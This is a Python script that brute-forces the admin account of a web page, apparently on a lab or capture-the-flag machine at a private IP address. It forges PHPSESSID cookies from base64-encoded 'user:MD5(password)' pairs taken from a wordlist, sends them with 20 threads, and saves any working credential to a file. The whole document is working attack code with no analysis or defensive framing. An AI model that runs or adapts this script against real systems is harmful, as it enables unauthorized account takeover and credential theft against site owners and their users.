import requests
import hashlib
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed

base_url = "http://10.65.147.25"
target_path = "/administration.php"
target_url = base_url + target_path
username = "admin"
wordlist = ".passwords_list.txt"

VERBOSE = True

def encode_session(user, password):
    # we encode the password
    md_5pass = hashlib.md5(password.encode()).hexdigest()
    # we put it with the user
    session_data = f"{user}:{md_5pass}"
    # We encode both in base 64
    encoded_session = base64.b64encode(session_data.encode()).decode()
    return encoded_session

# function to try the right password
def try_password(password):
    # we strip the password
    password = password.strip()
    # if there s no password return None
    if not password:
        return None
    # session value is the encoded session with the username and the password
    session_val = encode_session(username, password)
    # and the cookie to be the same in the browser
    cookies = {"PHPSESSID": session_val}
    # then we try it
    try:
        # using requests.get instead of a shared session object to avoid thread contention/state issues
        # also fixed the url concatenation issue (target_url was just the path)
        r = requests.get(target_url, cookies=cookies, timeout=5)

        if VERBOSE:
            print(f"[*] Trying password = {password} -> {session_val[:12]}...")

        # Check success condition
        if "Access denied" not in r.text and "only admin can access this page" not in r.text:
            print(f"[+] Password found : {password}")
            return password, session_val
    except Exception as e:
        print(f"[-] Error trying password {password} : {e}")
    return None

if __name__ == "__main__":
    # open the wordlist
    try:
        with open(wordlist, 'r', encoding="latin-1", errors="ignore") as f:
            passwords = f.readlines()

        print(f"[*] Loaded {len(passwords)} passwords to try on {target_url}")

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(try_password, password) for password in passwords]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    password, cookie = result
                    print(f"SUCCESS : {username}:{password} -> {cookie[:12]}...")
                    with open("found.txt", "w") as f:
                        f.write(f"{username}:{password} -> {cookie}\n")

                    # Cancel remaining futures
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
    except FileNotFoundError:
        print(f"[-] Wordlist file '{wordlist}' not found.")
    except Exception as e:
        print(f"[-] An error occurred: {e}")
